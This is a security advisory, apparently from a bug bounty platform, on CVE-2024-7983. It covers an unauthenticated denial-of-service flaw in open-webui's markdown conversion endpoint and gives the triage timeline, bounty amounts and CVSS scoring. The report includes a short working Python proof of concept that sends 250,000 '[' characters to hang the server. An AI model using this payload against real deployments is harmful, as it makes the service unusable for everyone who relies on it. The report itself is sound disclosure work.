Denial of service through endpoint for converting markdown in open-webui/open-webui Valid Reported on Jul 12th 2024 Summary The open-webui -project exposes an endpoint for converting markdown to HTML. The endpoint requires no auth. A maliciously crafted markdown payload causes the server to spend excessive time converting it, causes the server to hang and be unresponsive to other requests until the conversion is complete. POC Set up and run open-webui using the setup-guide . Run the following Python-script: import requests import json # Can be quite large. This ran for at least an hour (and counting) payload = "[" * 250000 rep = requests.post( "http://localhost:3000/api/v1/utils/markdown" , json={ "md" : payload
}) Observe that both the front-end and API are unresponsive while the request is pending. Description The endpoint is get_html_from_markdown in routers/utils , and calls markdown.markdown on a user-controllable string. The package that supplies this function is https://github.com/Python-Markdown/markdown/ , and this problem in particular is known and discussed here . A possible workaround would be to place this endpoint (at least) user auth, or somehow sanitize/detect payloads like this. Impact This vulnerability allows an attacker to cause complete denial of service with a single request while the attack is ongoing. Occurrences utils.py L49 We are processing your report and will contact the open-webui team within 24 hours. 5 months ago We were unable to make contact with the open-webui team automatically, our community manager will try to reach out to them instead. 5 months ago patrik-ha modified the report 5 months ago This report has now been passed to internal triage and should be resolved within 14 days. 4 months ago Ethan Silvas validated this vulnerability 4 months ago Validated this works without user permissions and will make the app unusable for all users for a very long time. patrik-ha has been awarded the disclosure bounty The fix bounty is now up for grabs The researcher's credibility has increased: +7 CVE-2024-7983 assigned to this report. 4 months ago We have notified the open-webui/open-webui maintainers about this report in their weekly follow-up 2 months ago We have sent a warning to the open-webui team to inform them that this report will be published in 48 hours 2 months ago This vulnerability has now been published 2 months ago Sign in to join this conversation
CVE CVE-2024-7983 (assigned, under review) Vulnerability Type CWE-400: Denial of Service Severity High (7.5) Attack vector Network Attack complexity Low Privileges required None User interaction None Scope Unchanged Confidentiality None Integrity None Availability High Open in visual CVSS calculator Registry Other Affected Version 0.3.8 Visibility Public Status Awaiting fix Disclosure Bounty $600 Fix Bounty $150 Found by patrik-ha @patrik-ha LIGHTWEIGHT